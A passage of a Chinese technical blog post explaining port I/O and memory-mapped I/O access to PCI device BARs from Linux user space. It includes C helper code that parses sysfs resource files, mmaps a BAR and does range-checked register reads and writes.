function_">pio_write16</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">uint16_t</span> v)</span>&#123; <span class="type">uint16_t</span> p; <span class="keyword">if</span> (pio_port(off,<span class="number">2</span>,&amp;p)) <span class="keyword">return</span>; outw(v,p); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_write32</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">uint32_t</span> v)</span>&#123; <span class="type">uint16_t</span> p; <span class="keyword">if</span> (pio_port(off,<span class="number">4</span>,&amp;p)) <span class="keyword">return</span>; outl(v,p); &#125;</span><br></pre></td></tr></table></figure></div>

<p>使用示例：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (pio_init(<span class="string">&quot;0000:00:04.0&quot;</span>, <span class="number">-1</span>) != <span class="number">0</span>) &#123; perror(<span class="string">&quot;pio_init&quot;</span>); <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PIO base=0x%04x size=0x%x\n&quot;</span>, pio_base(), pio_size());</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> v = pio_read32(<span class="number">0x64</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;R32 @ +0x64 = 0x%08x\n&quot;</span>, v);</span><br><span class="line">    pio_write32(<span class="number">0x64</span>, v | <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    pio_fini();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="MMIO（Memory-Mapped-I-O，内存映射-I-O）"><a href="#MMIO（Memory-Mapped-I-O，内存映射-I-O）" class="headerlink" title="MMIO（Memory-Mapped I&#x2F;O，内存映射 I&#x2F;O）"></a>MMIO（Memory-Mapped I&#x2F;O，内存映射 I&#x2F;O）</h4><p>MMIO 指的是把设备的一段寄存器&#x2F;门铃窗口“映射”到<strong>物理地址空间</strong>（由 <strong>BAR</strong> 决定）。CPU 用普通的<strong>内存读写</strong>指令访问这些地址，就等价于在读写设备寄存器。</p>
<p>设备在配置空间里有 <strong>BAR0..BAR5</strong>。固件&#x2F;OS 为 <strong>Memory BAR</strong> 分配一段对齐的物理地址，并把这个地址写回 BAR。</p>
<blockquote>
<p><strong>&#x2F;proc&#x2F;iomem ⇒ “物理内存地址空间”的全局地图</strong><br>包含了<strong>MMIO 区</strong>（设备的 memory BAR）、以及 System RAM、ACPI&#x2F;固件、ROM、内核代码数据、主桥下行 <strong>window</strong> 等等。也就是：不止 MMIO，但<strong>所有 MMIO 都会在这里出现</strong>。</p>
<p>对 <strong>设备 MMIO 的用户态映射</strong>（通过 <code>/sys/.../resourceN</code> 或 <code>/dev/mem</code> + <code>remap_pfn_range</code> 建出来的 <code>VM_IO | VM_PFNMAP</code> VMA），<code>/proc/self/pagemap</code> <strong>不会</strong>给出有效 PFN，很多内核版本直接把 PFN 置 0（或把 present 位清掉），因此你对 <code>g_mmio.bar</code> 调 <code>virt_to_phys()</code> 会得到 <code>0</code> → 打印成 <code>(nil)</code>。而匿名页是普通 RAM，所以能拿到 <code>0x2e08000</code> 这种正常的物理地址。</p>
<p>换句话说：<strong>pagemap 只适合“内存页(RAM)”</strong>，不适合<strong>设备 I&#x2F;O 映射</strong>。MMIO 的“物理地址”应当由<strong>映射来源</strong>来确定，而不是再去反查 pagemap。</p>
</blockquote>
<p>MMIO 读写模板：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORESOURCE_MEM 0x00000200ULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">uint8_t</span> *bar;   <span class="comment">// 映射后的虚拟基址</span></span><br><span class="line">    <span class="type">size_t</span>  size;            <span class="comment">// 资源真实大小（end - start + 1）</span></span><br><span class="line">    <span class="type">size_t</span>  map_len;         <span class="comment">// 实际 mmap 的长度（按页对齐）</span></span><br><span class="line">    <span class="type">int</span>     fd;              <span class="comment">// 打开的 /sys/.../resourceN</span></span><br><span class="line">    <span class="type">int</span>     res_idx;         <span class="comment">// 选中的 resource 行号（BAR 号 0..5）</span></span><br><span class="line">    <span class="comment">// 新增：物理信息</span></span><br><span class="line">    <span class="type">uint64_t</span> phys_start;     <span class="comment">// 该映射对应的设备物理起始地址（BAR 起点）</span></span><br><span class="line">    <span class="type">uint64_t</span> phys_end;       <span class="comment">// 物理结束地址（含端点）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> res_flags; <span class="comment">// resource 行里的 flags（可用于判断 WC 等）</span></span><br><span class="line">    <span class="type">bool</span>    inited;</span><br><span class="line">&#125; <span class="type">mmio_ctx_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">mmio_ctx_t</span> g_mmio = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：把 BDF 或 /sys/.../resource 解析成两个路径 --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">build_paths</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *bdf_or_path,</span></span><br><span class="line"><span class="params">                       <span class="type">char</span> *resource_txt, <span class="type">size_t</span> txt_sz,</span></span><br><span class="line"><span class="params">                       <span class="type">char</span> *dev_dir, <span class="type">size_t</span> dir_sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!bdf_or_path || !*bdf_or_path) &#123; errno = EINVAL; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strchr</span>(bdf_or_path, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">/* 直接传了 /sys/.../resource 或 /sys/.../resourceN */</span></span><br><span class="line">        <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="built_in">snprintf</span>(dev_dir,      dir_sz, <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="type">char</span> *slash = <span class="built_in">strrchr</span>(dev_dir, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!slash) &#123; errno = EINVAL; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">        *slash = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="comment">// 如果传进来的是 resourceN，把它回退到目录再去拼 resource</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(resource_txt, <span class="string">&quot;/resource&quot;</span>) &amp;&amp; resource_txt[<span class="built_in">strlen</span>(resource_txt)<span class="number">-1</span>] &gt;= <span class="string">&#x27;0&#x27;</span></span><br><span class="line">                                             &amp;&amp; resource_txt[<span class="built_in">strlen</span>(resource_txt)<span class="number">-1</span>] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;%s/resource&quot;</span>, dev_dir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 传的是 BDF */</span></span><br><span class="line">        <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;/sys/bus/pci/devices/%s/resource&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="built_in">snprintf</span>(dev_dir,      dir_sz, <span class="string">&quot;/sys/bus/pci/devices/%s&quot;</span>,          bdf_or_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：解析 resource 文本，找内存型 BAR（或指定 BAR） --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">parse_mem_bar</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *resource_txt, <span class="type">int</span> bar_idx,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *start,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *end,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *flags,</span></span><br><span class="line"><span class="params">                         <span class="type">int</span> *picked_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = fopen(resource_txt, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>, sel = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp)) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> s=<span class="number">0</span>, e=<span class="number">0</span>, f=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot;%llx %llx %llx&quot;</span>, &amp;s, &amp;e, &amp;f) != <span class="number">3</span>) &#123; idx++; <span class="keyword">continue</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bar_idx &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx == bar_idx) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(f &amp; IORESOURCE_MEM) || e &lt; s) &#123; fclose(fp); errno = EINVAL; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">                sel = idx; <span class="keyword">if</span> (start) *start = s; <span class="keyword">if</span> (end) *end = e; <span class="keyword">if</span> (flags) *flags = f; <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx &lt;= <span class="number">5</span> &amp;&amp; (f &amp; IORESOURCE_MEM)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (e &lt; s) &#123; fclose(fp); errno = ERANGE; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">                sel = idx; <span class="keyword">if</span> (start) *start = s; <span class="keyword">if</span> (end) *end = e; <span class="keyword">if</span> (flags) *flags = f; <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">if</span> (sel &lt; <span class="number">0</span>) &#123; errno = ENOENT; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (picked_idx) *picked_idx = sel;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 对外：初始化 / 映射 --- */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mmio_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *bdf_or_path, <span class="type">int</span> bar_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.inited) &#123; errno = EALREADY; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> resource_txt[PATH_MAX];</span><br><span class="line">    <span class="type">char</span> dev_dir[PATH_MAX];</span><br><span class="line">    <span class="keyword">if</span> (build_paths(bdf_or_path, resource_txt, <span class="keyword">sizeof</span>(resource_txt),</span><br><span class="line">                    dev_dir, <span class="keyword">sizeof</span>(dev_dir)) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> start=<span class="number">0</span>, end=<span class="number">0</span>, flags=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> res_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (parse_mem_bar(resource_txt, bar_idx, &amp;start, &amp;end, &amp;flags, &amp;res_idx) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> size = (<span class="type">size_t</span>)((end - start) + <span class="number">1ULL</span>);</span><br><span class="line">    <span class="type">size_t</span> pg   = (<span class="type">size_t</span>)sysconf(_SC_PAGESIZE);</span><br><span class="line">    <span class="type">size_t</span> map_len = (size + pg - <span class="number">1</span>) &amp; ~(pg - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> res_path[PATH_MAX];</span><br><span class="line">    <span class="built_in">snprintf</span>(res_path, <span class="keyword">sizeof</span>(res_path), <span class="string">&quot;%s/resource%d&quot;</span>, dev_dir, res_idx);</span><br><span class="line">    <span class="type">int</span> fd = open(res_path, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对 MMIO，MAP_SHARED 必须；是否加 MAP_POPULATE 对 MMIO 不关键</span></span><br><span class="line">    <span class="type">void</span> *<span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, map_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">map</span> == MAP_FAILED) &#123; <span class="type">int</span> sv = errno; close(fd); errno = sv; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    g_mmio.bar        = (<span class="keyword">volatile</span> <span class="type">uint8_t</span> *)<span class="built_in">map</span>;</span><br><span class="line">    g_mmio.size       = size;</span><br><span class="line">    g_mmio.map_len    = map_len;</span><br><span class="line">    g_mmio.fd         = fd;</span><br><span class="line">    g_mmio.res_idx    = res_idx;</span><br><span class="line">    g_mmio.phys_start = (<span class="type">uint64_t</span>)start;</span><br><span class="line">    g_mmio.phys_end   = (<span class="type">uint64_t</span>)end;</span><br><span class="line">    g_mmio.res_flags  = flags;</span><br><span class="line">    g_mmio.inited     = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_fini</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.bar) munmap((<span class="type">void</span> *)g_mmio.bar, g_mmio.map_len);</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.fd &gt;= <span class="number">0</span>) close(g_mmio.fd);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;g_mmio, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_mmio));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 查询（虚拟信息） --- */</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">void</span> *<span class="title function_">mmio_base</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.bar; &#125;</span><br><span class="line"><span class="type">size_t</span>         <span class="title function_">mmio_size</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.size; &#125;</span><br><span class="line"><span class="type">int</span>            <span class="title function_">mmio_bar_index</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.res_idx; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 查询（物理信息） --- */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_phys_base</span><span class="params">(<span class="type">void</span>)</span>  &#123; <span class="keyword">return</span> g_mmio.phys_start; &#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_phys_limit</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.phys_end;   &#125; <span class="comment">// inclusive</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* off -&gt; 设备物理地址（范围检查） */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_offset_to_phys</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited) &#123; errno = EPERM;  <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (off &gt;= g_mmio.size) &#123; errno = ERANGE; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="keyword">return</span> g_mmio.phys_start + (<span class="type">uint64_t</span>)off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* VA(映射内某指针) -&gt; 设备物理地址（范围检查） */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_virt_to_phys</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited || !p) &#123; errno = EPERM; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="type">uintptr_t</span> base = (<span class="type">uintptr_t</span>)g_mmio.bar;</span><br><span class="line">    <span class="type">uintptr_t</span> addr = (<span class="type">uintptr_t</span>)p;</span><br><span class="line">    <span class="keyword">if</span> (addr &lt; base || addr &gt;= base + g_mmio.size) &#123; errno = EINVAL; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="type">size_t</span> off = (<span class="type">size_t</span>)(addr - base);</span><br><span class="line">    <span class="keyword">return</span> g_mmio.phys_start + (<span class="type">uint64_t</span>)off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：范围检查 --- */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">chk</span><span class="params">(<span class="type">size_t</span> off, <span class="type">size_t</span> width)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited) &#123; errno = EPERM;  <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (off + width &gt; g_mmio.size) &#123; errno = ERANGE; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 读写 API（按天然宽度访问；PCI 寄存器通常小端） --- */</span></span><br><span class="line"><span class="type">uint8_t</span>  <span class="title function_">mmio_read8</span> <span class="params">(<span class="type">size_t</span> off)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">1</span>)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint8_t</span> *)(g_mmio.bar + off); &#125;</span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">mmio_read16</span><span class="params">(<span class="type">size_t</span> off)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">2</span>)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)(g_mmio.bar + off); &#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read32</span><span class="params">(<span class="type">size_t</span> off)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)(g_mmio.bar + off); &#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read64</span><span class="params">(<span class="type">size_t</span> off)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">8</span>)) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)(g_mmio.bar + off); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write8</span> <span class="params">(<span class="type">size_t</span> off, <span class="type">uint8_t</span>  v)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">1</span>)) <span class="keyword">return</span>; *(<span class="keyword">volatile</span> <span class="type">uint8_t</span> *)(g_mmio.bar + off) = v; &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write16</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint16_t</span> v)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">2</span>)) <span class="keyword">return</span>; *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)(g_mmio.bar + off) = v; &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write32</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint32_t</span> v)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">4</span>)) <span class="keyword">return</span>; *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)(g_mmio.bar + off) = v; &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint64_t</span> v)</span>&#123; <span class="keyword">if</span> (chk(off,<span class="number">8</span>)) <span class="keyword">return</span>; *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)(g_mmio.bar + off) = v; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回映射内某 offset 的可直接访问指针 */</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">void</span> *<span class="title function_">mmio_ptr</span><span class="params">(<span class="type">size_t</span> off)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off,<span class="number">1</span>)) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">volatile</span> <span class="type">void</span> *)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">uint8_t</span> *bar;      <span class="comment">// 映射后的虚拟基址 (VA)</span></span><br><span class="line">    <span class="type">size_t</span>  size;               <span class="comment">// 资源真实大小 (end - start + 1)</span></span><br><span class="line">    <span class="type">size_t</span>  map_len;            <span class="comment">// 实际 mmap 的长度 (页对齐)</span></span><br><span 